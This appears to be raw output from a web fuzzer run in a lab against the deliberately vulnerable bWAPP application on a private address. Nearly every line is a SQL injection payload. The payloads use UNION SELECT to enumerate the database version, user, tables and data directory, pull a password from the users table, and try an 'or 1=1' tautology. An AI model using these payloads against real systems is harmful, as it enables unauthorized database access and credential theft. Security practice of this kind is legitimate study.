51,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,@@version,9,10--"
53,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,8,9,@@version--"
52,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,8,@@version,10--"
54,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
60,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,4,database(),6,7,8,9,10--"
59,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,database(),5,6,7,8,9,10--"
57,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,database(),3,4,5,6,7,8,9,10--"
58,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,database(),4,5,6,7,8,9,10--"
55,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%20database()--
56,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%20database(),2,3,4,5,6,7,8,9,10--"
65,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,8,9,database()--"
66,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
63,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,database(),9,10--"
64,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,8,database(),10--"
67,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
62,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,4,5,6,database(),8,9,10--"
69,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,user(),3,4,5,6,7,8,9,10--"
68,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%20user(),2,3,4,5,6,7,8,9,10--"
61,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,4,5,database(),7,8,9,10--"
70,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,user(),4,5,6,7,8,9,10--"
73,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,4,5,user(),7,8,9,10--"
72,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,4,user(),6,7,8,9,10--"
71,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,user(),5,6,7,8,9,10--"
75,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,user(),9,10--"
74,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,4,5,6,user(),8,9,10--"
76,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,8,user(),10--"
78,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
77,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,8,9,user()--"
79,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%20table_name,2%20from%20information_schema.tables--"
81,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%20table_name,2,3%20from%20information_schema.tables--"
80,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,table_name,2%20from%20information_schema.tables--"
83,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,table_name,2,3,4,5%20from%20information_schema.tables--"
87,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=hello%20world',(select%20*%20from%20bWAPP.users%20where%20id=1%20limit%200,1))--"
85,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='===%20stored(blog)==='
84,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
88,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=hello%20world',(select%20*%20from%20databases()%20where%20id=1%20limit%200,1))--"
82,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,table_name,2,3,4%20from%20information_schema.tables--"
86,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=hello%20world',(select%20password%20from%20bWAPP.users%20where%20id=1%20limit%200,1))--"
89,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=hello%20world',(select%20databases()))--"
90,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=hello%20world',(select%20user()))--"
91,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=hello%20world',(select%20system_user())--"
92,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=hello%20world',(select%20@@version))--"
93,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=hello%20world',(select%20@@datadir))--"
94,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
96,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201--
97,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
95,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='====%20GET%20Search%20==='
98,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
100,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
99,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=')%20or%201=1%20][('%20or
